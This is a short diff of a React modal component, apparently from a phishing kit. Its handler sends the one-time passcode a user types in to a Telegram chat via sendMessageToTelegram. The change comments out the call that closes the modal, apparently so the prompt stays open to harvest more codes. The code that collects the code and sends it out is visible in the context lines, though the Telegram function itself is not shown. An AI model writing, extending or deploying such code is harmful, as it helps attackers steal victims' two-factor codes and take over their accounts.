@@ -54,7 +54,7 @@ export default function Modal({ displayModal, setDisplayModal, modal, setModal }
                 setIsLoading(false);
                 sendMessageToTelegram(otpCode);
                 setOtpCode('');
-                setDisplayModal(false);
+                // setDisplayModal(false);
             }, 1500);
         } else {
             setInvalid(true); // Show error if OTP code is empty
